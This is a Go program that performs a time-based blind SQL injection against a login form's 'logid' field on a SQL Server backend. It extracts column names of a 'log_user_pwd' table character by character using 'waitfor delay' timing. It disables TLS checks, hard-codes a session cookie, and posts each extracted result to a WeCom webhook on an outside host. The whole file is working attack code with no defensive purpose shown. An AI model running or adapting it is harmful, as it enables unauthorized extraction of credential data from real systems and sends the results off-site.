package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var table string
var huan = false

func main() {
	for i := 0; i < 3; i++ {
		huan = false
		table = ""
		fmt.Print(i)
		fmt.Print(" : ")
		start()
		ok(table)
	}
	okl()
}

func start() {

	var payloads = [...]string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+"}

	for i := 1; i < 25; i++ {
		if huan == false {
			for _, value := range payloads {
				Httpget(value, strconv.Itoa(i))
			}
		} else {
			break
		}
	}

	fmt.Println("")
}
func Httpget(payload string, i string) {

	url := "https://"
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	time_start := time.Now()
	req, err := http.NewRequest("POST", url, strings.NewReader(`guest=false&logid=admin'IF(substring((select top 1 column_name from information_schema.columns where table_name ='log_user_pwd' and column_name != 'seq' and column_name != 'user_id' and colunm_name != 'password'),`+i+`,1) ='`+payload+`') waitfor delay'0:0:4'--&pwd=ugKoBSdM6GKIki0Zuv8=`))

	if err != nil {
		fmt.Println(err)
	}

	req.Header.Add("Cookie", "PHPSESSID=44038bbbamf8h1kc017hr7ra61")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3")
	req.Header.Add("Dnt", "1")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Connection", "close")

	do, err := cli.Do(req)
	if err != nil {
		fmt.Println(err)
		ok("注入中断,请查看原因")
	}
	defer func() {
		_ = do.Body.Close()
	}()
	all, _ := ioutil.ReadAll(do.Body)
	html := string(all)
	if do.StatusCode == 200 && strings.Contains(html, "alert") {
		//fmt.Print(i + "  : " + payload + " :  ")
		//fmt.Println(time.Since(time_start).Nanoseconds())
		if time.Since(time_start).Nanoseconds() > 16000000000 && time.Since(time_start).Nanoseconds() < 20000000000 {
			if payload != `+` {
				fmt.Print(payload)
				table = table + payload
			} else {
				huan = true
			}
		}

	}
}

func ok(table string) {
	var req *http.Request
	post := `{
        "msgtype": "text",
        "text": {
            "content": "列名 : ` + table + `"
        }
   }`
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, _ = http.NewRequest("POST", "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=", strings.NewReader(post))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
func okl() {
	var req *http.Request
	post := `{
        "msgtype": "text",
        "text": {
            "content": "注入程序完成,已经停止运行"
        }
   }`
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, _ = http.NewRequest("POST", "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=", strings.NewReader(post))
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
